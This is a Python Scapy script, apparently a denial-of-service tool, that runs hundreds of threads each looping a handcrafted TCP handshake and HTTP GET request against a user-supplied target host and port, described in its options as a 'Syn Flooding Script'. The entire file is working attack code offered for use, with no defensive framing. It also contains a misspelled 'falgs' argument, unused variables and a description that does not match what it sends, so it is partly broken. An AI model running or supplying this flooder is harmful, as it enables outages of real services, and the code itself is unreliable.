
import threading
from optparse import OptionParser
from scapy.all import *


global options, s_seq, d_seq
SOURCE = ['.'.join((str(random.randint(1,254)) for _ in range(4))) for _ in range(100)]
get_str ='GET / HTTP/1.0 \r\n\r\n'
class RunCC(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run(self):
        while(True):
            GetFlood(options)


def GetFlood(args):
    dst_ip = args.target
    dst_port = args.target_port
    src_port = 20001
    data = 'GET / HTTP/1.1\r\nHost: %s\r\nAccept: */*\r\nContent-Length:0\r\nUser-Agent: Mozilla/5.0 WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36\r\nConnection:Close\r\n\r\n'
    try:
        ##generate SYN package
        spk1 = IP(dst=dst_ip)/TCP(dport=dst_port,sport=src_port,flags="S")
        res1 = sr1(spk1)
        ack1 = res1[TCP].ack
        ack2 = res1[TCP].seq + 1
        ##sending ack package, finish the three-time-handshake
        spk2 = IP(dst=dst_ip)/TCP(dport=dst_port,sport=src_port,seq=ack1,ack=ack2,falgs="A")
        send(spk2)
    except Exception as e:
        print(e)
    ##sending the first data package, let the flag = 24
    da1 = IP(dst=dst_ip)/TCP(dport=dst_port,sport=src_port,seq=ack1,ack=ack2,flags=24)/(data%dst_ip)
    res2 = send(da1)



if __name__ == '__main__':
	parser=OptionParser(description='Syn Flooding Script written in Python using SCAPY.')
	parser.add_option("-t", "--target", action="store", dest="target", default=False, type="string", help="test target")
	parser.add_option('-p','--target_port',action = "store",dest = "target_port",default = 80,type="int",help='Port of your Target.')
	parser.add_option("-x", "--threadnum", action="store", dest="threadnum", default=250, type="int", help="thread number")
	(options,args) = parser.parse_args()
	CC_Dict = {}
	for threadseq in range(options.threadnum):
		CC_Dict["Thread_%s"%threadseq] = RunCC()

	for k,v in CC_Dict.items():
		v.start()

	for k,v in CC_Dict.items():
		v.join()